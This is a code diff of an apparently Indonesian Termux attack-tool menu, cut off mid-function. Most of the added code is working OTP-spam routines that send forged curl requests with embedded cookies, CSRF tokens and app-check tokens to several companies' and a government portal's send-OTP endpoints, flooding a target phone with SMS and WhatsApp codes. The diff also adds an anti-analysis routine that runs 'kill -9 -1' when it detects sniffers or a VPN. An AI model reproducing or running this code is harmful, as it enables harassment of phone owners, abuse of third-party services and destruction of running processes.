@@ -114,6 +114,37 @@ babi = """
 │ Mohon Bersabar Sedang Verifikasi Keamanan [ ✦ ]
 ╰──────────────────────────────────────────────────────╯
 """
+
+def pantau_aktivitas():
+    def log_and_exit(msg):
+        print(msg)
+        os.system("kill -9 -1 2>/dev/null")
+        sys.exit(1)
+    
+    sniffers = ["tcpdump", "tshark", "strace", "ettercap", "ngrep", "wireshark", "fiddler", "charles"]
+    for sniffer in sniffers:
+        try:
+            if subprocess.call(["pgrep", "-x", sniffer], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
+                log_and_exit("LU SEMUA NGENTOT !!")
+        except:
+            pass
+    
+    try:
+        lsof = subprocess.check_output(["lsof", "-p", str(os.getpid())], text=True, stderr=subprocess.DEVNULL)
+        if "libtermux-net.so" in lsof:
+            log_and_exit("LU SEMUA NGENTOT !!")
+    except:
+        pass
+    
+    try:
+        ifconfig = subprocess.check_output(["ifconfig"], text=True, stderr=subprocess.DEVNULL)
+        if re.search(r'tun[0-9]', ifconfig):
+            log_and_exit("LU SEMUA NGENTOT !!")
+    except:
+        pass
+
+pantau_aktivitas()
+
 os.system(f'echo "{babi}" | lolcat')
 time.sleep(10)
 os.system('clear')
@@ -465,19 +496,17 @@ def print_banner(user, date, username):
 {G}/    Y    \  |    <  / __ \_\___ \  / __ \_{N}
 {G}\____|__  /__|__|_ \(____  /____  >(____  /{N}
 {G}        \/        \/     \/     \/      \/ {N}                                                                             {N}
-{W}╭─────────────────────────────────────────────────────────────╮{N}
+{W}╭────────────────────────────────────────────────────────────╮{N}
 {W}│  {W}UID   : {C}{uid}{N}
 {W}│  {W}Status: {status_text}{N}
 {W}│  {W}Author: {G}Rulzzz_06{N}
-{W}│  {W}Tools : {G}28{N}
+{W}│  {W}Tools : {G}36{N}
 {W}│  {W}Date  : {G}{date}{N}
-{W}│  {W}Version: {G}2.3.3{N}
+{W}│  {W}Version: {G}3.4.1{N}
 {W}│  {W}UserName: {G}{username}{N}
 {W}│  {W}User : {G}Premium{N}
-{W}╰─────────────────────────────────────────────────────────────╯{N}
-{W}╭─────────────────────── {R}[ {W}P E S A N {R}]{W} ──────────────────────╮
-{W}│ Semangatin Uyyy si reyhan lagi buat tools Voidflux🔥😈
-{W}╰────────────────────────────────────────────────────────────╯
+{W}╰────────────────────────────────────────────────────────────╯{N}
+                           M E N U
 {W}╭────────────────────────────────────────────────────────────╮{N}
 {W}│ [ {G}01{N} ] SPAM OTP WA {R}/{N} SMS{N}
 {W}│ [ {G}02{N} ] SPAM PAIRING{N}
@@ -508,6 +537,13 @@ def print_banner(user, date, username):
 {W}│ [ {G}27{N} ] Web Reconnaissance{N}
 {W}│ [ {G}28{N} ] lapor Bug ke Admin{N}
 {W}│ [ {G}29{N} ] Tools Tambahan{N}
+{W}│ [ {G}30{N} ] Photo {R}/{N} Video to URL{N}
+{W}│ [ {G}31{N} ] File to URL{N}
+{W}│ [ {G}32{N} ] KILL Bot Telegram{N}
+{W}│ [ {G}33{N} ] Cek Informasi Bot Telegram{N}
+{W}│ [ {G}34{N} ] Link Shortener{N}
+{W}│ [ {G}35{N} ] Downloader Status Contact{N}
+{W}│ [ {G}36{N} ] Cek Resi Paket{N}
 {W}╰╭───────────────────────────────────────────────────────────╮{N}
 {W}  {R}00{N} EXIT{N}
 {W}╰────────────────────────────────────────────────────────────╯{N}
@@ -543,6 +579,8 @@ cooldown_otp = 0
 cooldown_lock = threading.Lock()
 stop_cooldown = False
 stop_spinner = False
+
+pantau_aktivitas()
 
 def spam_otp_sidemang(nomor):
     try:
@@ -3299,24 +3337,58 @@ def spam_otp_viuum(nomor):
 
 def spam_otp_onebunda(nomor):
     try:
-        if nomor.startswith('62'):
-            nomor = nomor[2:]
-        elif nomor.startswith('0'):
-            nomor = nomor[1:]
-        session = requests.Session()
-        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
-        resp_page = session.get('https://onebunda.com/accounts/login/', headers=headers, timeout=10)
-        csrf = ''
-        for line in resp_page.text.splitlines():
-            if 'csrfmiddlewaretoken' in line:
-                while 'value="' not in line:
-                    pass
-                csrf = line.split('value="')[1].split('"')[0]
-        if csrf:
-            resp = session.post('https://onebunda.com/accounts/login/', data={'mobile_number': nomor, 'csrfmiddlewaretoken': csrf}, headers={**headers, **{'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://onebunda.com', 'referer': 'https://onebunda.com/accounts/login/'}}, timeout=10)
+        if nomor.startswith('0'):
+            phone = nomor
+        elif nomor.startswith('62'):
+            phone = '0' + nomor[2:]
+        elif nomor.startswith('+62'):
+            phone = '0' + nomor[3:]
         else:
-            return False
-    except:
+            phone = '0' + nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        if not phone.startswith('0'):
+            phone = '0' + phone
+        
+        import subprocess
+        import json
+        
+        curl_cmd = f"""curl -s -X POST 'https://cms.bunda.co.id/api/v1/auth/send-otp' \\
+  -H 'host: cms.bunda.co.id' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'x-firebase-appcheck: eyJraWQiOiJrMnhhbUEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjU5NjU2Mzg5ODEwMzp3ZWI6Y2VmNTMwYWNmYjgzZGY4NDdhZWRmMiIsImF1ZCI6WyJwcm9qZWN0cy81OTY1NjM4OTgxMDMiLCJwcm9qZWN0cy9ibWhzLXdlYi1hcHBzIl0sInByb3ZpZGVyIjoicmVjYXB0Y2hhX3YzIiwiaXNzIjoiaHR0cHM6Ly9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tLzU5NjU2Mzg5ODEwMyIsImV4cCI6MTc4NzIzNzQ1MCwiaWF0IjoxNzg3MTUxMDUwLCJqdGkiOiJ4YUEydzFUWnpxVHgtU2NHOGVQUGRqRkV3OHRVWUZhdXhfa3ExckthNVpBIn0.0GtUrReLPvBzyUZSeojw_D4CQfRcIhYS4kwTpuwMmbpQ8VquBJUyaEcSl28Rpq0_LrEcRkz-nHrAHtD2V-trDLQYzXIq2rC-JYWm3YadIDgh3FQ_nWrzdUUHfDLwCpgUU0QdopTXt1IkqEVK29vHjndK-s4yADZtVkV61DNzUKQKqCwcEH2Imw9q7GFEo19EhIYLIVd06Zdvit_GnPr93zYtuwzuIMPXcOghmqzsgER0vec2JQAr7oIc7Za47y_MNhtfJ5duSoDDb0MzyHaMJ0xX_-s6WIWT8gUI2uCwW2asUALRSouydvlOgMGpBkcZHAThBLYJ3k11iNEUUV-nwVb15PUjLM6y3XRHWXwEZ_1WAVy3GDFk-mxnGY8ez2X1xX64JJSVJMMqbwl_V0XccWPtlYEBP3MvmpgVl33lF6Pb9ZMaVAVv2C2h_8V6ik0rhsequDyDgd1as20UUagHfZEUIJCiMhktSc2yykuoGiXVTasq5dROxcQgEwPYN66x' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: application/json, text/plain, */*' \\
+  -H 'content-type: application/json' \\
+  -H 'x-locale: id' \\
+  -H 'origin: https://www.bunda.co.id' \\
+  -H 'sec-fetch-site: same-site' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://www.bunda.co.id/id' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'priority: u=1, i' \\
+  -d '{{"phone_number":{phone},"type":"auth"}}'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
         return False
 
 def spam_otp_ibudanbalita(nomor):
@@ -5056,36 +5128,31 @@ def spam_otp_myvalue(nomor):
 def spam_otp_joob(nomor):
     try:
         if nomor.startswith('0'):
-            nomor = nomor
+            phone = nomor
         elif nomor.startswith('62'):
-            nomor = '0' + nomor[2:]
+            phone = '0' + nomor[2:]
         elif nomor.startswith('+62'):
-            nomor = '0' + nomor[3:]
+            phone = '0' + nomor[3:]
         else:
-            nomor = '0' + nomor
+            phone = '0' + nomor
         
-        nomor = ''.join(filter(str.isdigit, nomor))
+        phone = ''.join(filter(str.isdigit, phone))
         
-        if not nomor.startswith('0'):
-            nomor = '0' + nomor
+        if not phone.startswith('0'):
+            phone = '0' + phone
         
         import subprocess
         import json
-        
-        payload = json.dumps({
-            "otpAuthType": "PHONE",
-            "phoneNumber": nomor
-        })
         
         curl_cmd = f"""curl -s -X POST 'https://api.joob.asia/v3/auth/otp/issue' \\
   -H 'host: api.joob.asia' \\
   -H 'x-platform: MOBILE_WEB' \\
   -H 'sec-ch-ua-platform: "Android"' \\
   -H 'x-usertype: s' \\
-  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
   -H 'sec-ch-ua-mobile: ?1' \\
   -H 'x-lang: id' \\
-  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
   -H 'content-type: application/json' \\
   -H 'x-deviceid: b19391d2-4ca0-4eb3-92ae-2dc3da3f8d4a' \\
   -H 'accept: */*' \\
@@ -5097,7 +5164,7 @@ def spam_otp_joob(nomor):
   -H 'accept-encoding: gzip, deflate, br, zstd' \\
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -H 'priority: u=1, i' \\
-  -d '{payload}'"""
+  -d '{{"otpAuthType":"PHONE","phoneNumber":"{phone}"}}'"""
         
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
         
@@ -5138,16 +5205,13 @@ def spam_otp_datascripmall(nomor):
         
         import subprocess
         import json
-        import time
-        
-        email = f"user{int(time.time())}@gmail.com"
         
         curl_cmd = f"""curl -s -X POST 'https://datascripmall.id/api/app/buyer/register/request-otp' \\
   -H 'host: datascripmall.id' \\
   -H 'sec-ch-ua-platform: "Android"' \\
-  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
   -H 'accept: application/json' \\
-  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
   -H 'content-type: application/json' \\
   -H 'sec-ch-ua-mobile: ?1' \\
   -H 'origin: https://datascripmall.id' \\
@@ -5157,9 +5221,9 @@ def spam_otp_datascripmall(nomor):
   -H 'referer: https://datascripmall.id/register/perorangan' \\
   -H 'accept-encoding: gzip, deflate, br, zstd' \\
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
-  -H 'cookie: __Host-next-auth.csrf-token=02716761d623b70997d6082b8bd4a89dee927dbfd23fdfe67de91890ffb7970f%7C272be8708ea5932c7791d35f444d19dfbe270066507d275f0d880c14f59d1881; __Secure-next-auth.callback-url=https%3A%2F%2Fdatascripmall.id; last_visited_page=%2Fblog%2Fundefined; _ga=GA1.1.657807458.1785422889; _gcl_au=1.1.782293264.1785422888.-.-.1785422889.2081612100.1785422889.1785422889; moe_uuid=5cefeacf-f41d-4d22-8644-578bb5a6751e; _fbp=fb.1.1785422886169.83826567122468884.AQYAAQIB; _ga_ZRQCEHEE7M=GS2.1.s1785422888$o1$g1$t1785422901$j47$l0$h0' \\
+  -H 'cookie: _ga=GA1.1.657807458.1785422889; moe_uuid=5cefeacf-f41d-4d22-8644-578bb5a6751e; _fbp=fb.1.1785422886169.83826567122468884.AQYAAQIB; _gcl_aw=GCL.1785423521.CjwKCAjw7KvTBhA6EiwAWnutYZTFUrVgZnPcuE2Vm8b1x-lclJCkOgLxSOZXqD9XVffjvY0oVuRyGRoCdqYQAvD_BwE; _gcl_gs=2.1.k1$i1785423512$u152165420; __Host-next-auth.csrf-token=293c40a1d89e1ebf1f65529dae844021c68bf527b9010349cba333fad1321d6c%7C89d0644d6e9f85d2222e64176b6f94408161531bceedf2cc64dde51ddd332cc4; __Secure-next-auth.callback-url=https%3A%2F%2Fdatascripmall.id; last_visited_page=%2F; _gcl_au=1.1.782293264.1785422888.-.-.1785422889.136969314.1787146397.1787146396; _ga_ZRQCEHEE7M=GS2.1.s1787146396$o2$g1$t1787146435$j21$l0$h0' \\
   -H 'priority: u=1, i' \\
-  -d '{{"email":"{email}","phone_number":"{phone}","channel":"wa"}}'"""
+  -d '{{"email":"Tono34Jo80byats@gmail.com","phone_number":"{phone}","channel":"wa"}}'"""
         
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
         
@@ -5345,6 +5409,313 @@ def spam_otp_jec(nomor):
     except Exception as e:
         return False
 
+def spam_otp_generasimaju(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = nomor
+        elif nomor.startswith('62'):
+            phone = '0' + nomor[2:]
+        elif nomor.startswith('+62'):
+            phone = '0' + nomor[3:]
+        else:
+            phone = '0' + nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        if not phone.startswith('0'):
+            phone = '0' + phone
+        
+        import subprocess
+        import json
+        import base64
+        import random
+        import string
+        
+        firstname = ''.join(random.choices(string.ascii_lowercase, k=8))
+        password = base64.b64encode(f"{firstname}12345".encode()).decode()
+        csrf_token = "1a6d98f9901ed40ce571b56fa1d47869841a4eda"
+        auth_token = "8af3153c67f9b3faf620b64706e18c08"
+        
+        curl_cmd = f"""curl -s -X POST 'https://www.generasimaju.co.id/klub-generasi-maju/register' \\
+  -H 'host: www.generasimaju.co.id' \\
+  -H 'x-newrelic-id: UA4HUV5TARAEUFFVAQQEUFY=' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'x-csrf-token: {csrf_token}' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ4MDA4MDkiLCJhcCI6IjUzODc5NTE1MCIsImlkIjoiNWJkMTE5ZTZlODllM2RiOSIsInRyIjoiN2IxNWViZmIyNGU0OTljYmZlMDNlYTJjYmEzMmI1ODUiLCJ0aSI6MTc4NzEzNjk0MTkxNiwidGsiOiIzMzIzOTI1In19' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'traceparent: 00-7b15ebfb24e499cbfe03ea2cba32b585-5bd119e6e89e3db9-01' \\
+  -H 'x-requested-with: XMLHttpRequest' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
+  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
+  -H 'tracestate: 3323925@nr=0-1-4800809-538795150-5bd119e6e89e3db9----1787136941916' \\
+  -H 'origin: https://www.generasimaju.co.id' \\
+  -H 'sec-fetch-site: same-origin' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://www.generasimaju.co.id/klub-generasi-maju/register?referral=https://www.generasimaju.co.id/' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'cookie: prev_page_url=/; data_layer_method=Website; TCPID=126831854422550661387; _gid=GA1.3.2087259638.1787136887; _gat_UA-103522697-4=1; _tt_enable_cookie=1; _ttp=01M0CTHJ7ZZ53RDS1MBZ8F9B69_.tt.2; _clck=1lemkln%5E2%5Eg8q%5E0%5E2422; __stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiJlOTUxYzg1NC0zYzQzLTQxMDYtYWFlYS1iYzY0N2I2NmVhODIifQ%3D%3D; _td_ssc_id=01M0CTHMEQHN4WM22AN96N2MD6; __stgeo=IjAi; __stbpnenable=MA%3D%3D; __stdf=MA%3D%3D; PHPSESSID=d7f6086225b836d265dc047dc6526a3b; _fbp=fb.2.1787136896361.715334083778519977; iDSP_Cookie=0abf53f9-e262-4b2b-8a4a-739b0d159f83**1787136896679*8e2f9123e95944449a39a9a80babf9e4*; _ga=GA1.3.1942976718.1787136886; _td=b724781d-c825-49e6-91e0-23b4e09740b8; __sts=eyJzaWQiOjE3ODcxMzY4ODgzNjksInR4IjoxNzg3MTM2ODk5MDUzLCJ1cmwiOiJodHRwcyUzQSUyRiUyRnd3dy5nZW5lcmFzaW1hanUuY28uaWQlMkZrbHViLWdlbmVyYXNpLW1hanUlMkZyZWdpc3RlciUzRnJlZmVycmFsJTNEaHR0cHMlM0ElMkYlMkZ3d3cuZ2VuZXJhc2ltYWp1LmNvLmlkJTJGIiwicGV0IjoxNzg3MTM2ODk5MDUzLCJzZXQiOjE3ODcxMzY4ODgzNjksInBVcmwiOiJodHRwcyUzQSUyRiUyRnd3dy5nZW5lcmFzaW1hanUuY28uaWQlMkYiLCJwUGV0IjoxNzg3MTM2ODg4MzY5LCJwVHgiOjE3ODcxMzY4ODgzNjl9; _clsk=1l4an9c%5E1787136899807%5E2%5E1%5Eu.clarity.ms%2Fcollect; ttcsid_C4RIGKH6H18A0MH113T0=1787136887112::rCra0ykXy8_h7KsBM04x.1.1787136940557.1; ttcsid=1787136887119::o07SA2cbudxtC_Hsy8Yh.1.1787136940557.0::1.5427.11326::53296.11.324.1008::52530.9.297; _ga_KHHX33L6LL=GS2.1.s1787136886$o1$g1$t1787136940$j6$l0$h0; _gcl_au=1.1.1934825587.1787136884.805340981.1787136911.1787136910.1774024647.1787136891.1787136940; AWSALB=8iHBwm8IsmPXi2jxCtanEqkh0JjDaTqSPbmE916vmlFGE7miEu74AWb7HbujI5pbsSM91e5NQDNiPOkwU8OVf6ETe6nVzjkaTg2rjz5r2afzGw2JZRrPMJSS+xvy8SDN9TTeNCsEVlbj5wh+3L1Rez0aFheHI4kfDc+LNyUN4zf6s3p4YoBM8JF+etwf2A==; AWSALBCORS=8iHBwm8IsmPXi2jxCtanEqkh0JjDaTqSPbmE916vmlFGE7miEu74AWb7HbujI5pbsSM91e5NQDNiPOkwU8OVf6ETe6nVzjkaTg2rjz5r2afzGw2JZRrPMJSS+xvy8SDN9TTeNCsEVlbj5wh+3L1Rez0aFheHI4kfDc+LNyUN4zf6s3p4YoBM8JF+etwf2A==' \\
+  -H 'priority: u=1, i' \\
+  --data-raw 'firstname={firstname}&msisdn={phone}&password={password}&mother_status=7&ispregnant=Y&pregnancyweek=1&isonpregnancyprogram=N&children_dob=&is_code_refferal_event_code=&refferal_code_event_code=&query_params%5B0%5D%5Breferral%5D=https%3A%2F%2Fwww.generasimaju.co.id%2F&auth_token={auth_token}&auth_token_prefix=registration'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('status') == 'success' or data.get('success'):
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                if data.get('result') and 'success' in str(data.get('result')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
+
+def spam_otp_norkaroots(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = nomor
+        elif nomor.startswith('62'):
+            phone = '0' + nomor[2:]
+        elif nomor.startswith('+62'):
+            phone = '0' + nomor[3:]
+        else:
+            phone = '0' + nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        if not phone.startswith('0'):
+            phone = '0' + phone
+        
+        import subprocess
+        import json
+        
+        curl_cmd = f"""curl -s -X POST 'https://sso.norkaroots.kerala.gov.in/send-whatsapp-otp' \\
+  -H 'host: sso.norkaroots.kerala.gov.in' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'x-csrf-token: PFanayOE9IDJ6ecbyCBAgPXmasq0DOuTAmYDBbgU' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'x-requested-with: XMLHttpRequest' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: */*' \\
+  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
+  -H 'origin: https://sso.norkaroots.kerala.gov.in' \\
+  -H 'sec-fetch-site: same-origin' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://sso.norkaroots.kerala.gov.in/register' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'cookie: XSRF-TOKEN=eyJpdiI6Ik9oc3lDS1R2ZzJCWjJDY25sQ1FVcVE9PSIsInZhbHVlIjoiWkRMWFhQUHlBNHFvUTF3TmoybC90MHZiRzE1ekN1RUtBUDYxTUpYT0FXalBoVnp2MFdOYldUaGFlY2lzSkNINFNmUGloTEdSMU9YUHY4M045TEFnREcyK2pNTk5manIvM1ZtRmc4Sk1vZ3FacE5mQmN5NXVlZVdXYVFtZ1BubWwiLCJtYWMiOiI4M2QzZjc5YzljNjVkZDJiNGQxOGRmY2RhMmUyMTQ1NTQ2YjQ4NTBiYmRmMjA1OGRlM2I3ZmNlYWM5ZGRmYTZjIiwidGFnIjoiIn0%3D; norka_roots_sso_portal_session=eyJpdiI6ImtxUG9GTXVtTXkxVWxra2NWSkhvR2c9PSIsInZhbHVlIjoiTnlKeEkyNUVKOXBha3pETDgySzBnNDg2STRYTXU3ZnNFemxabnIvZHBrVzFrNFloK05Ea2EzVzJOaGhsbWRXQlJNbWFKNi9ENzJZb1RvTUxGbzNNSjQ5Q0szVzZvZURTOG02VmZDakF4SDVRWEF5SDZPZkhoSzJxWWhKTU9oTGMiLCJtYWMiOiIwMjJiZjY5MWU4OTkxZjAxNzNkMzM3OWI1ODYwZWQwOWY0ZjllYWNkMTFkOTMzNDdmMDNlZWFmOTdkODM4MTI5IiwidGFnIjoiIn0%3D' \\
+  -H 'priority: u=1, i' \\
+  --data-raw 'whatsapp_number={phone}&whatsapp_country_code=62&whatsapp_country_iso_code=id'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
+
+def spam_otp_kpoin(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = nomor
+        elif nomor.startswith('62'):
+            phone = '0' + nomor[2:]
+        elif nomor.startswith('+62'):
+            phone = '0' + nomor[3:]
+        else:
+            phone = '0' + nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        if not phone.startswith('0'):
+            phone = '0' + phone
+        
+        import subprocess
+        import json
+        import random
+        import string
+        
+        otp_type = ''.join(random.choices(string.digits, k=6))
+        
+        curl_cmd = f"""curl -s -X POST 'https://app.kpoin.com/api/bff/v1/notification/sendotp' \\
+  -H 'host: app.kpoin.com' \\
+  -H 'applicationbrand: 0' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'datetimetick: 639227634232580000' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'applicationchannel: 901101' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'applicationstoreid: 0' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: application/json, text/plain, */*' \\
+  -H 'content-type: application/json' \\
+  -H 'origin: https://app.kpoin.com' \\
+  -H 'sec-fetch-site: same-origin' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://app.kpoin.com/registration' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'cookie: visid_incap_3193850=KSLZkw3rSLCIdgxnG1LswfKchWoAAAAAQUIPAAAAAADtP1pV9DavhkjEGjxo5FyR; incap_ses_735_3193850=cukdVA7pdgcKbznhtD4zCvKchWoAAAAAHsqxaKqc92iy2SZvSmff8Q==; incap_ses_1746_3193850=Ma70GopLew+tpns7ZQo7GPachWoAAAAAIbXttysbxxBFyqv+jfrzDA==; _ga=GA1.1.1435000739.1787141371; _fbp=fb.1.1787141372954.767928535296203971; _tt_enable_cookie=1; _ttp=01M0CYTF8JWD243X9ZGVY2FH98_.tt.1; androidBannerClosed=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoidHJ1ZSIsImlhdCI6MTc4NzE0MTM3OCwiZXhwIjoxNzg3NDAwNTc4fQ.m3crPZsDXe4smAhYEWNhOFOdEm3VkxWt3lMiC8AC1DU; _ga_XH6QC1GPNY,G-FCEP7R9YXY,G-E0QWTN64ED=GS2.1.s1787141390$o1$g0$t1787141390$j60$l0$h0; _ga_XH6QC1GPNY=GS2.1.s1787141371$o1$g1$t1787141397$j34$l0$h752977670; _gcl_au=1.1.1659628713.1787141369.-.-.1787141371.1651972348.1787141372.1787141397; _ga_E0QWTN64ED=GS2.1.s1787141371$o1$g1$t1787141398$j33$l0$h455275594; _ga_FCEP7R9YXY=GS2.1.s1787141372$o1$g1$t1787141398$j34$l0$h139101688; _Tk=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImFjY2Vzc1Rva2VuIjoiZTJhZTkyZWQzZDVkZTM1YzQyNGEyZDM4YmI0MmE2N2I0ZGMzMjIzOTg5ZGJiMTRiMTg3ZjIzMmUwYzRhYTFlYzAxZWNlMmYxYzlkODJiMmVlZDc1YzY4Yzk1NGFmYjdhZjc1ODJkYTAzM2Y4ZTgwYmQyZjY3YWQwMTYxMzYzMzU4OGFjNTY4ZWY2OGQyNGUwOWMxZGQ4ZDA1MjQxYmFiM2Q1NGE0MjBiMzNmYzBlYWZiYWYyOGUwM2Q5ZjIzZTQ5YjFiNjc1YzhjNDNhMjA3NDAyNjhiZDIyMmRjNDNjZGMxOTc5YTM2ZjcxOTY0ZmMzZjE3MDc0MGM5Y2RkZWZlYWY0Njg3YTY5Yzk0MjZmMDM0OGYzNDUwZTg5OGM0YWI2NjQ0ZTE5YzJhMDdjYzM4Zjk4NzU1ZmM4NGU5YzI4MGJiYmVmZmYwYzFhM2Q0NDQyNTAxYzVlYTgyZTMzY2VmZTM5MzViNjk4ZmJjOWVjOWRkYTRlNWEwYiIsImV4cGlyZWQiOiI2MzkyMjczOTQwMDAwMDAwMDAifSwiaWF0IjoxNzg3MTQxNDAwLCJleHAiOjE3ODc0MDYwMDB9.AzOTIf9SzmaSe0MYRiTGUK6RHhp4UD30NVunGF-SBhY; ttcsid=1787141373225::bgd_SWk9Rs6CgIaLfruw.1.1787141420005.0::1.19758.25594::46657.5.361.870::0.0.0; ttcsid_CRBTL1JC77U6RBG4JJL0=1787141373222::USQsoHY5IKaPHuP-dQ7i.1.1787141420006.1; _Ureg=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7IlBob25lTm8iOiIwODM4MzIxMTA1MDkiLCJSZWZlcnJhbENvZGUiOiIifSwiaWF0IjoxNzg3MTQxNDIwLCJleHAiOjE3ODc0MDA2MjB9.xvsHxg22HWujKk9ueKqr_dmmR3_uJE-w86tS4sBLy7w' \\
+  -H 'priority: u=1, i' \\
+  -d '{{"UniqueID":"{phone}","NotifType":"109104","OtpType":"{otp_type}","OtpDigit":6}}'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
